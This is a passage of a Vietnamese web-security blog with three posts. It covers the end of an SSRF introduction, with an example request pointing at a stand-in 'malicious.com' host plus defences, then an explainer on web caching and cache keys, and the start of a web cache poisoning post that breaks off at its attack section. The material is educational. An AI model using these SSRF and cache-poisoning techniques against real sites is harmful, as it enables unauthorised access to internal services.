+<p>Nhìn vào hình bên trên, nó sẽ giải thích cách tấn công SSRF, attacker sẽ gửi một URL có chứa payload tới nơi có chứa lỗ hổng trên web app thông qua Request A.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p><em>GET payload/return?url=</em><a rel="noreferrer noopener" href="http://malicious.com/" target="_blank"><em>http://malicious.com/</em></a><em>&nbsp;HTTP/1.1<br>Host: victim.com</em></p><cite>Ví dụ</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Trong yêu cầu trên, chúng ta có thể thấy máy chủ lưu trữ là victim.com và yêu cầu GET đang lấy tham số của "url" , tham số của url không được kiểm soát .Lúc này webapp sẽ lấy giá trị của "url" để tạo ra một request khác (Request B) tới "http://malicious.com" . Máy chủ lúc này sẽ nhận và xử lý việc thực hiện request B .Tiếp tục webapp lúc này sẽ hiển thị một số hoặc toàn bộ kết quả trả về máy chủ , dựa vào đó attacker có thể truy cập dữ liệu trái phép hoặc thực hiện các cuộc tấn công khác như :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li>Port Scanning</li><li>Denial of Service</li><li>Tấn công vào các ứng dụng khác trong hệ thống bằng các kĩ thuật như Buffer Overflow</li><li><a href="http://hydrasky.ml/2020/03/cross-site-scripting-part1" target="_blank" rel="noopener">Cross Site Script</a></li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p>Thông thường SSRF đều có thể tồn tại trong những mục có liên quan đến path url như  redirect, file path ...</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://miro.medium.com/max/1368/1*FVIKVlXUN8_WqiVAmwM5GA.png" alt="Kết quả hình ảnh cho ssrf exploit"/><figcaption>Ví dụ SSRF</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Trường hợp đặc biệt, webapp không trả về bất kì điều gì dấu hiệu gì thì vẫn có khả năng tồn tại lỗ hổng được gọi là Blind SSRF. Để xác định Blind SSRF bạn cần phải có một server bên ngoài mở một port bất kì và set payload của bạn về địa chỉ với port đang lắng nghe của server.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":118,"width":592,"height":104,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image.jpeg" alt="Kết quả hình ảnh cho ssrf via dns rebinding" class="wp-image-118" width="592" height="104"/><figcaption>Ví dụ SSRF</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Hoặc đơn giản nhất bạn có thể dùng Burp Collaborator được tích hợp trong Burpsuite (Công cụ của PortSwigger) - <a href="https://portswigger.net/burp/documentation/collaborator" target="_blank" rel="noopener">Link hướng dẫn</a> .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://static.packt-cdn.com/products/9781789531732/graphics/61e54233-2d8a-4ed6-aee1-2e4e10e77780.png" alt="Kết quả hình ảnh cho Burp Collaborator"/><figcaption>Burp Collaborator</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Cách ngăn chặn phòng chống SSRF</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Việc sử dụng blacklist và regular expressions để kiểm soát đầu vào rất khó và không hữu hiệu. Sử dụng backlist có thể ảnh hưởng đến các chức năng và công việc. Còn regular expressions thì cũng rất dễ để hacker tìm cách bypass như  <a href="http://www.pc-help.org/obscure.htm" target="_blank" rel="noopener">Malicious URL’s Using DWORD Formatted IP&nbsp;Addresses </a>.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Phương pháp hiệu quả để tránh SSRF là liệt kê danh sách tên DNS hoặc địa chỉ IP mà ứng dụng của bạn cần truy cập (Whitelist). Thực chất SSRF không có bản sửa lỗi cụ thể vì nó phụ thuộc nhiều vào chức năng ứng dụng và yêu cầu kinh doanh. Việc sử dụng một loại list rất khó để bảo vệ nên kết hợp Backlist với whitelist  nhưng điều quan trọng là phải xác thực hợp lệ đầu vào của người dùng.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Không những phải kiểm xoát đầu vào bạn cần phải kiểm soát dữ liệu trả về cho người dùng.Để ngăn chặn dữ liệu phản hồi rò rỉ cho kẻ tấn công, phải đảm bảo rằng phản hồi nhận được như ý muốn.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Kẻ tấn công thường dùng<a href="https://en.wikipedia.org/wiki/List_of_URI_schemes" target="_blank" rel="noopener"> URL schemas</a> để khai thác hệ thống thông qua lỗ hổng SSRF vì vậy nên vô hiệu hóa một số URL schemas như file:///, dict://, ftp:// và gopher://.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Kẻ tấn công có thể sử dụng lỗ hổng Server Side Request Forgery để truy cập một số dịch vụ này mà không cần bất kỳ xác thực nào.&nbsp;Do đó, để đảm bảo bảo mật ứng dụng web, tốt nhất là cho phép xác thực bất cứ nơi nào có thể, ngay cả đối với các dịch vụ trên mạng cục bộ.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Trong phần tiếp theo mình sẽ phân tích rõ các cách thức tấn công qua lỗ hổng này !</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Link tham khảo </h4>
+<!-- /wp:heading -->
+
+<!-- wp:list -->
+<ul><li><a href="https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/</a></li><li><a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener">https://portswigger.net/web-security/ssrf</a></li><li>Mastering Modern Web Penetration Testing Book - Prakhar Prasad</li></ul>
+<!-- /wp:list -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/15/WEB%20Pentesting/Web%20Server/Server%20Side%20Request%20Forgery%20(Part1)/" data-id="ckbgnw37w0002jnjmeeogh5r2" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TECH/Web Cache &amp; Cache Key" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/15/TECH/Web%20Cache%20&%20Cache%20Key/" class="article-date">
+  <time datetime="2020-06-15T15:25:13.272Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/15/TECH/Web%20Cache%20&%20Cache%20Key/">TECH/Web Cache &amp; Cache Key</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:heading -->
+<h2>Web Cache</h2>
+<!-- /wp:heading -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://techvccloud.mediacdn.vn/2018/6/18/web-cache-1529296599109108897388.png" alt="Web cache là gì? Tác dụng đối với website? - Ảnh 1."/></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading {"level":4} -->
+<h4>ĐỊnh nghĩa</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Web cache (HTTP cache) là một dứng dụng công nghệ thông tin cho bộ nhớ tạm thời (caching ) để chứa các phản hồi từ hệ thống máy chủ, giúp giảm thiểu dữ liệu cần được truyền qua mạng.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://i.imgur.com/CnTvQBC.png" alt="Pentest Q&amp;A cùng Tsu] #7: Web-Cache Poisoning | Tsu BlogS ٩(^‿^)۶"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p> Web cache là một vùng nhớ  giữa client và server có nhiệm vụ là lưu trữ bản sao của những tài nguyên web sao cho gần với người dùng, cả về mặt chức năng trong web client hoặc những web caching servers riêng biệt. Tài nguyên đó có thể là :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li>Ảnh</li><li>CSS</li><li>Các file HTML tĩnh</li><li>Các file Javascript</li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p><strong>Tại sao lại cần Caching? </strong></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://betterexplained.com/wp-content/uploads/compression/HTTP_request.png" alt="Yêu cầu HTTP"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Thử nghĩ khi bạn truy cập vào 1 website bán hàng, trình duyệt sẽ phải load về rất nhiều nội dung như file ảnh, js, html .... Nếu không dùng có cache thì mỗi lần truy cập vào website đó tất cả nội dung sẽ lại phải load lại lần nữa. Như vậy mỗi lần click hay chuyển tag mà băng thông yếu cái chắc "tui nhìn mà tui  tức quá " chưa kể có nếu như có nhiều người truy cập đến website nữa. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://images.viblo.asia/72dcd966-26ed-46a7-8565-0ba1cb7c59bb.png" alt=""/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Lúc này bạn chỉ muốn load thật nhanh còn sysadmin muốn giảm gánh nặng cho máy chủ nên người ta đã dùng cách lưu lại các response các request thường gặp cả ở trên phía máy chủ (Server-side caching) và phía người dùng (Browser caching). Máy chủ sẽ không phải xử lý từng request riêng biệt nữa mà thay vào đó bộ cache sẽ giúp nó gửi trả ngay một response. Một giải pháp khác là bạn mua thêm nhiều máy chủ khác nhưng tất nhiên là bạn sẽ phải có rất nhiều tiền (Và ở đây chúng tôi không làm thees)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Nội dung cache được lưu trữ ở đâu? </h4>
+<!-- /wp:heading -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://image.slidesharecdn.com/cacheinapigateway-150418032736-conversion-gate01/95/cache-in-api-gateway-18-638.jpg?cb=1429499697" alt=""/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p><strong>Server-side caching</strong> </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Người ta thường gọi là Surrogate Cache bởi vì nó hoạt động như Gateway cache . Một  Surrogate Cache là một server lưu các files tĩnh để phục vụ cho việc gửi trả lại các response cho các request phổ biến. Nó sẽ tiếp nhận các request thông thường và nhanh chóng gửi response. Caching proxy sẽ giúp máy chủ chính của bạn không phải xử lý các request này, do đó giảm gánh nặng cho phía server.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><strong>Browser caching</strong></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Trình duyệt sẽ phân vùng một lượng nhất định trên ổ cứng của máy tính. Dung lượng này dành để lưu trữ những nội dung bạn đã xem. Hình thức này cho phép truy xuất thông tin khá nhanh do dữ liệu web được lấy trực tiếp từ máy tính người dùng thay vì phải tải lại qua đường truyền mạng và cũng góp phần giảm lưu lượng phía server. Ví dụ trình duyệt lưu một bản sao của một tệp (như hình ảnh logo) và sử dụng bản sao được lưu trong bộ nhớ cache (đã lưu) này trên mỗi trang bạn vào mà cần logo đó.&nbsp;Điều này tránh phải tải xuống hình ảnh một lần nữa và hoàn hảo  phải không?</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"width":593,"height":333} -->
+<figure class="wp-block-image is-resized"><img src="https://techtalk.vn/wp-content/uploads/2017/11/NO.jpg" alt="Kết quả hình ảnh cho no" width="593" height="333"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Đó lại là vấn đề ! Điều gì xảy ra khi logo công ty thay đổi?&nbsp;SOCOLA =&gt; CORONA</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Bạn sẽ vẫn lướt truy cập vào website đó như thường nhưng bạn sẽ không biết logo của website đã được thay đổi bởi vì cái logo đang xuất hiện trong trình duyệt của bạn là từ browser cache mà ra. Bạn thử nghĩ thay vì 1 cái logo là file js hoặc html điều gì sẽ xảy ra ? . Kệ  m* thôi bởi vì đã có cách khăc phục mà hehe:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Gateway Cache sẽ lưu các files khác nhau ở những thời điểm khác nhau, nó sẽ quyết định xem files nào nên cache và các files đã được cache có tiếp tục được sử dụng không. Máy chủ báo cho trình duyệt&nbsp;<strong>version</strong>&nbsp;của tệp mà nó đang gửi.&nbsp;Máy chủ sẽ trả về một&nbsp;<code>Last-modified</code> - header response cùng với tệp (giả sử là logo.png), như thế này:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><code>Last-modified: Fri, 16 Mar 2007 04:00:25 GMT</code>&nbsp;<code>File Contents (could be an image, HTML, CSS, Javascript...)</code></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Bây giờ trình duyệt biết rằng tệp mà nó nhận được (logo.png) đã được tạo vào ngày 16 tháng 3 năm 2007 và nó sẽ tiếp tục dùng logo từ Browser cache. Lần tiếp theo nếu  trình duyệt cần logo.png, nó sẽ tiếp tục thực hiện kiểm tra đặc biệt với máy chủ:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://betterexplained.com/wp-content/uploads/compression/HTTP-caching-last-modified_1.png" alt="HTTP caching last modified"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ngoài ra còn một số header response là "Etag" có nhiệm vụ xác thực  nội dung chính xác được lưu trong cache và "Expires , Cache-Control " để giới hạn thời gian, tránh trình duyệt không giao tiếp với máy chủ giả sử trong trường hợp file không thay đổi một thời gian dài. <a href="https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Chi tiết </a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><strong>Proxy Cache</strong></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ngoài hai nơi lưu trữ cache chính ra , trong một môi trường doanh nghiệp rộng lớn nguời ta còn sử dụng các thiết bị đòng vai trò Web proxy cache làm việc cùng nguyên tắc với browser cache, nhưng ở phương diện rộng lớn hơn. Proxy server đáp ứng hàng trăm hoặc hàng ngàn users cùng một cách thức, những tập đoàn lớn và IPS thường thiết lập chúng trên các firewalls, hoặc như một thiết bị độc lập (thường hiểu như là những phương tiện trung gian). Bởi vì proxy cache không phải là một phần của client hay server chính nên chúng ta không cần phải hiểu rõ. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"width":590,"height":334} -->
+<figure class="wp-block-image is-resized"><img src="https://cache.digistar.vn/wp-content/uploads/2016/12/cache-2.png" alt="Kết quả hình ảnh cho Proxy Cache" width="590" height="334"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Tiện ở đây có một khái niệm minh muốn giới thiệu là Mạng cung cấp nội dung - Content Delivery Network (CDN), là tập các máy chủ trung gian ( hay còn được gọi là   transparent proxy cache ) được đặt khắp nơi trên thế giới.Hoạt động như một "Gateway" vì vậy mọi request đến mấy chủ trung tâm đều tự động phải đi qua nó , mục đích là giảm thiểu yêu cầu lên máy chủ. Hoạt động như mô hình của Proxy cache . Bạn tưởng tượng xem như Facebook hay Amazon sẽ phải đặt bao nhiêu CDN trên thế giới. Ngoài ra còn các các dịch vụ cho thuê CDN như của cloudFlare, Akamai ... .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Tòm lại việc sử dụng cache rất có lợi cho website của bạn. Không những tối ưu băng thông, tốc độ cho cả người dùng lẫn server , cải thiện việc phân phối nội dung mà còn tăng khả năng bảo mật như chống DOS- DDOS.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>Cache Key</h2>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Làm thế nào để web cache nhận diện ra được 2 request là tương tự, là giống nhau và quyết định gửi luôn response cho request  tương tự hay là chuyển lên server lấy new source về.   </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Lập trình viên có thể cài đặt theo cơ chế so sánh byte to byte cho cache. Nhưng cách này kém hiệu quả vì quá trính xảy ra sẽ rất tốn thời gian và tài nguyên ngoài ra trong thành phần của request có nhiều header không ảnh hưởng đến response như " User-Agent" chẳng hạn.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Có một cách khác đó chính là sử dụng Cache Key - là sử dụng một số thành phần cụ thể của HTTP request dùng để dùng để xác định resource đang được yêu cầu và các request tương đương . </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":162,"width":596,"height":168,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-7.png" alt="" class="wp-image-162" width="596" height="168"/><figcaption> Ví dụ Cache key ( Màu cam) </figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ngoài ra còn người ta còn sử dụng một header response là "Vary" - dùng để chỉ định những header (ngoại trừ đường dẫn-URL và Host ) nào thêm vào request cần bị khóa lại - để nhận response dúngý sẽ bắt buộc phải có các header được xác thực qua "vary". Mặc dù header này rất hữu hiệu nhưng nếu sử dụng không chính xác có thể dẫn đến tình trạng tụt tỉ lệ hiệu suất, dữ kiệu chuyển đi bị sai lệch rất là cao nên header này được thiết lập qua loa hay thậm chí không được sử dụng.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"width":283,"height":148} -->
+<figure class="wp-block-image is-resized"><img src="https://2.bp.blogspot.com/-E_npOkaDOHc/Ur8HBKisJxI/AAAAAAAAAO8/WhdtGvuDwsc/w1200-h630-p-k-no-nu/vary-header-not-working.png" alt="gZip Compression removes pre-existing vary header | Sitecore Tactics" width="283" height="148"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p><a href="https://www.keycdn.com/support/vary-header" target="_blank" rel="noreferrer noopener" aria-label="Chi tiết tham khảo (opens in a new tab)">Chi tiết tham khảo</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Xong như vậy mình đã giới thiệu xong về web cache và cache key! Có gì thắc mặc các bạn có thể để lại comment bên dưới . Thank !</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>[UPDATE-10/4/2020]</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Làm sao để biết được reponse được trả về từ cache ?</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Một câu hỏi rất hay ! Mình cũng đã đi tìm và câu trả lời của mình lúc này cũng chưa chính thức nha. Theo như mình tìm hiểu sẽ có 2 cách để xác định được response đó từ cache hay trực tiếp từ server .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Cách đầu tiên đó là dựa vào "status code" HTTP và ở đây là mã "304 Not Modified" - không có sữa đổi. Điều này có nghĩa là tài nguyên được lấy lúc này không có gì thay đVổi và nó sẽ lấy từ cache về thay vì chuyển hướng đến server.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/images/http-cache-control.png" alt="HTTP Caching | Web Fundamentals | Google Developers"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Cách hai đó chính là dựa vào response header trong response được trả về đó là X-Cache và X-Cache-Lookup header. Thực chất 2 header này không phải là hai chuẩn được quy định trong RFC (Prefix "X"- không phải là chuẩn HTTP Header Field. Nó hay được dùng bởi các CDN và vì vậy các tên gọi của nó cũng có thể được thay đổi theo ý họ.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li>"X-Cache" tương ứng với việc proxy có lấy response từ cache hay không (HIT  là có và MISS là không)</li><li>"X-Cache-Lookup"  sẽ nói là proxy có lưu response cho request tương ứng hay không (HIT là có và MISS là không) #Thông thừơng header này ít gặp nên mình cũng không rõ lắm.</li></ul>
+<!-- /wp:list -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://1.bp.blogspot.com/--nwPp96Bsqc/W67uqZ76QPI/AAAAAAAAAHA/oSva9i5E4FsEeFfFa3Fsvjbn1GoeJ4segCLcBGAs/s1600/Screenshot_1.png" alt="Clement Nedelcu's Development Journal: How to fix: Nginx proxy or ..."/><figcaption>Ví dụ</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ngoài ra còn có các header khác như Age,Etag, exprires, Las-modified, cache-control cũng cho biết các thông tin về việc dữ liệu được lưu trữ trong cache.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Link Tham khảo</h4>
+<!-- /wp:heading -->
+
+<!-- wp:list -->
+<ul><li><a href="https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/" target="_blank" rel="noopener">https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/</a></li><li><a href="https://vi.wikipedia.org/wiki/Web_caching" target="_blank" rel="noopener">https://vi.wikipedia.org/wiki/Web_caching</a></li><li><a href="https://www.freecodecamp.org/news/web-caching-explained-by-buying-milk-at-the-supermarket-2ba6133ca4ed/" target="_blank" rel="noopener">https://www.freecodecamp.org/news/web-caching-explained-by-buying-milk-at-the-supermarket-2ba6133ca4ed/</a></li><li><a href="https://viblo.asia/p/nhung-dieu-can-biet-ve-web-cache-Qbq5QJLLKD8" target="_blank" rel="noopener">https://viblo.asia/p/nhung-dieu-can-biet-ve-web-cache-Qbq5QJLLKD8</a></li><li><a href="https://docs.microsoft.com/en-us/azure/cdn/cdn-caching-rules" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/azure/cdn/cdn-caching-rules</a></li><li>#Response </li><li><a href="https://publicobject.com/2015/03/26/how-do-http-caching-heuristics-work/" target="_blank" rel="noopener">https://publicobject.com/2015/03/26/how-do-http-caching-heuristics-work/</a></li><li><a href="https://stackoverflow.com/questions/3027492/x-cache-header-explanation/29772017" target="_blank" rel="noopener">https://stackoverflow.com/questions/3027492/x-cache-header-explanation/29772017</a></li><li><a href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching" target="_blank" rel="noopener">https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching</a></li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/15/TECH/Web%20Cache%20&%20Cache%20Key/" data-id="ckbgnw37n0000jnjm1zdw4d6b" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-WEB Pentesting/Web Server/Web Cache Poisoning  (Part 1)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/15/WEB%20Pentesting/Web%20Server/Web%20Cache%20Poisoning%20%20(Part%201)/" class="article-date">
+  <time datetime="2020-06-15T15:24:04.924Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/15/WEB%20Pentesting/Web%20Server/Web%20Cache%20Poisoning%20%20(Part%201)/">WEB Pentesting/Web Server/Web Cache Poisoning  (Part 1)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:paragraph -->
+<p>Là một trong những lỗ hổng yêu thích nên mình sẽ viết hơi dài dòng một chút nên phần này mình dành cho những bạn nào mới tìm hiểu nha . Trong phần này mình sẽ giới thiệu về web cache poisoning và yếu tố dẫn đến lỗ hổng cùng mốt số cách khai thác.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ngay khi bước vào tìm hiểu về web security chắc chắn sẽ ít ai để ý đến lỗ hổng này. Thậm trí trong các tài liệu và trong các khóa học đề cập rất ít đến nó nên vì thế lúc đầu  mình cũng không quan tâm cho lắm.Khi tìm hiểu về HTTP request Smuggling/ Response Splitting (lỗ hổng mình yêu thích ) thú vị thay mình tìm hiểu được về WCP. Nó rất thú vị như <a href="https://twitter.com/albinowax" target="_blank" rel="noreferrer noopener" aria-label="James Kettle (opens in a new tab)">James Kettle</a> nói !!! </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Đầu tiên, cần phải biết web cache và cache key là gì đã ? Nếu bạn chưa biết bạn có thể tham khảo một <a href="http://hydrasky.ml/2020/03/web-cache" target="_blank" rel="noopener">bài viết </a>của mình.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Web cache poisoning là gì ?</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Cứ theo tiếng anh mà dịch thì bạn cx đã hiểu được một phần rồi "Đầu độc web cache". Bằng cách khai thác một sô vấn đề của máy chủ và lợi dụng cache để phản hồi lại các HTTP reponse có nội dung độc hại từ kẻ tấn công cho người khác.Và đặc biệt lỗ hổng này có thể ảnh hưởng với quy mô rộng  lớn khác với lại các lỗ hổng cùng họ như Web Cache Deception.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Theo như mình tìm kiếm được , WCP  đã được đề cập trong danh sách lỗ hổng từ năm 2009 của OWASP với một cái tên  "<a rel="noreferrer noopener" aria-label="Cache Poisoning (opens in a new tab)" href="https://owasp.org/www-community/attacks/Cache_Poisoning" target="_blank">Cache Poisoning</a>" (Nghe rất chung chung bởi còn một số kiểu  cache poisoning khác thì sao như DNS cache poisoning-MITM ...) . Điều thú vị nữa là vào thời điểm này người ta cho rằng lỗ hổng này chỉ ở mức "lý thuyết" (theoretical) khó thể khai thác thực tế. Và rồi đến năm 2018 , James Kettle là một chuyên gia, giám đốc mảng Web Security của <a rel="noreferrer noopener" aria-label="Portswigger  (opens in a new tab)" href="https://portswigger.net/about" target="_blank">Portswigger</a> đã có một bài thuyết trình  về lỗ hổng này <a href="https://portswigger.net/research/practical-web-cache-poisoning" target="_blank" rel="noopener">Practical Web Cache Poisoning: Redefining 'Unexploitable'</a> <a href="https://www.youtube.com/watch?v=j2RrmNxJZ5c" target="_blank" rel="noopener">[Video]</a> của <a href="https://twitter.com/albinowax" target="_blank" rel="noopener">James Kettle</a> trong sự kiện bảo mật thông tin hàng đầu trên thế giới "Blackhat"  và James Kettle đã chững minh cho tất cả thấy rằng Web Cache Poisoning là  "not theoretical ". Các bạn nên xem để hiểu rõ hơn.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://infosec-conferences.com/wp-content/uploads/2019/11/logo-conference-series-blackhat-v1.png" alt=""/><figcaption>Logo của sự kiện BlackHat</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Và mình sẽ phân tích lỗ hổng này dựa vào bài thuyết trình của James Kettle. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Một vài điểm lưu ý ở lỗ hổng này ?</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Xét về tính chất của cache thì ta chia ra làm 2 loại là private cache và pubic (shared) cache. Private cache là cache được lưu trữ phía client (brower cache), được lưu cục bộ  còn public cache là nằm giữa client và server (proxy cache). Với lỗ hổng WCP thì chúng ta chỉ quan tâm  tới việc làm sao đầu độc public cache từ đó tấn công ảnh hưởng đến toàn bộ người dùng cùng proxy cache đó còn Private cache không liên quan.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Lỗ hổng quan tâm đến <a rel="noreferrer noopener" aria-label="Cache key (opens in a new tab)" href="http://hydrasky.ml/2020/03/web-cache" target="_blank">Cache key</a> , việc attacker xác định được cache key sẽ tăng khả năng bị tấn công. Ví dụ:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://i.imgur.com/wNyvExv.png" alt=""/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p> Cache keys ở đây là phần bôi cam cam ở trên, nếu request nào match 2 cái đó thì resource từ cache sẽ được trả về với nội dung bằng tiếng Anh (en)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Tương tự như vậy nếu ta request tiếp nhưng thay đổi ngôn ngữ là tiếng Ba Lan: </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://i.imgur.com/EbyDbkN.png" alt=""/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Cache sẽ so sách cache key và thấy match 2 cái key đó sẽ lại trả nội dung về nhưng không phải là tiếng Ba Lan mà vẫn là tiếng Anh. Trườn hợp nguy hại hơn là một payload độc hại hay một file javascript có chứa lỗ hổng đã được caching cho request trước thì các người dùng sau sẽ đều bị ảnh hưởng cho đến khi một response mới được lưu. Điều đó sẽ có thể dẫn đến lỗ hổng Cache Poisoning. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Cách thức tấn công</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
